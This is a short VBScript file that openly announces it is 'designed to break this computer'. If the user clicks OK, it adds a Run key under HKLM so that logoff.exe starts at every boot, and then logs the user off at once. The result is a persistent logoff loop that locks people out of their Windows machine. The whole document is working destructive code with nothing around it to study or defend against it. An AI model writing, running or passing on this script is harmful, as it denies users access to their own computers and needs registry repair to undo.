Option Explicit
On Error Resume Next

Dim response
response = msgbox("You are about to execute a VB script designed to break this computer." & vbcrlf & "Are you sure you wish to continue?", vbOKCancel, "WARNING")

If response = vbOK Then
	dim wshshell
	set wshshell = wscript.CreateObject("wscript.shell")
	wshshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\2261","logoff.exe", "REG_SZ"
	wshshell.run "logoff.exe"
End If